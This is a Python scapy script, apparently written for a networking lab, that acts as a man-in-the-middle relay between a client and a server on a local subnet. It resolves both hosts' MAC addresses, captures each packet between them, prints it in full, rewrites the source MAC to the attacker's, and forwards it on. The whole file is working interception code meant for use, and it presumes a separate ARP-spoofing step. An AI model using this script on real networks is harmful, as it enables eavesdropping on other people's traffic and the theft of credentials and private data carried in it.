#!/usr/bin/env python3
from scapy.all import sniff, Ether, IP, sendp, get_if_hwaddr, getmacbyip
import sys

# ================= Configuration =================
# You only need to specify the IP addresses and your network interface.
CLIENT_IP = "172.18.7.Y"   # Replace with Client IP
SERVER_IP = "172.18.7.10"  # Replace with Server IP (e.g., 172.18.7.10)
INTERFACE = "eth0"         # Adjust your network interface if needed (e.g., 'ens33')
ATTACKER_MAC = get_if_hwaddr(INTERFACE)
# =================================================

def main():
    print(f"[*] Starting MITM Attacker Script...")
    print(f"[*] Attacker MAC ({INTERFACE}): {ATTACKER_MAC}")
    print(f"[*] Resolving real MAC addresses for Client ({CLIENT_IP}) and Server ({SERVER_IP})...")

    client_mac = getmacbyip(CLIENT_IP)
    server_mac = getmacbyip(SERVER_IP)

    if not client_mac:
        print(f"[-] Error: Could not resolve MAC address for Client IP {CLIENT_IP}")
        sys.exit(1)
    if not server_mac:
        print(f"[-] Error: Could not resolve MAC address for Server IP {SERVER_IP}")
        sys.exit(1)

    print(f"[+] Discovered Client MAC: {client_mac}")
    print(f"[+] Discovered Server MAC: {server_mac}\n")
    print(f"[*] Intercepting traffic between Client and Server...\n")

    def packet_callback(packet):
        if packet.haslayer(Ether) and packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            src_mac = packet[Ether].src

            if src_mac == ATTACKER_MAC:
                return

            if src_ip == CLIENT_IP and dst_ip == SERVER_IP:
                print(f"[+] Captured packet: Client ({CLIENT_IP}) -> Server ({SERVER_IP})")
                packet.show2()

                packet[Ether].src = ATTACKER_MAC
                packet[Ether].dst = server_mac

                sendp(packet, iface=INTERFACE, verbose=False)
                print("[*] Forwarded packet to Server successfully.\n")

            elif src_ip == SERVER_IP and dst_ip == CLIENT_IP:
                print(f"[+] Captured packet: Server ({SERVER_IP}) -> Client ({CLIENT_IP})")
                packet.show2()

                packet[Ether].src = ATTACKER_MAC
                packet[Ether].dst = client_mac

                sendp(packet, iface=INTERFACE, verbose=False)
                print("[*] Forwarded packet to Client successfully.\n")

    bpf_filter = f"ip host {CLIENT_IP} and ip host {SERVER_IP}"
    sniff(iface=INTERFACE, filter=bpf_filter, prn=packet_callback, store=0)

if __name__ == "__main__":
    main()